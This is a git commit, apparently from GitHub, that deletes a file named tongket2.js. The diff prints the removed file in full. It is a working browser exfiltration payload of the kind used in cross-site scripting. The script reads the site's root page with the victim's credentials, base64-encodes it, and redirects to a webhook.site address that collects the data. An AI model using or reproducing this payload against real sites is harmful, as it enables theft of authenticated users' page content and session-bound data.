9b3c98d767045ab2bd7885cd925a123ceebe0c85
YoneD19 <53221480+YoneD19@users.noreply.github.com>
2022-09-06 10:42:28 +0700

    Delete tongket2.js

--- tongket2.js
+++
@@ -1,8 +0,0 @@
-var req = new XMLHttpRequest();
-req.open("GET","/",false);
-req.onreadystatechange = function(){
-  var res = req.response;
-  window.location = 'https://webhook.site/5714e407-e06e-49ba-a7fc-bff2e30c2104/q='+btoa(res);
-};
-req.withCredentials = true;
-req.send();
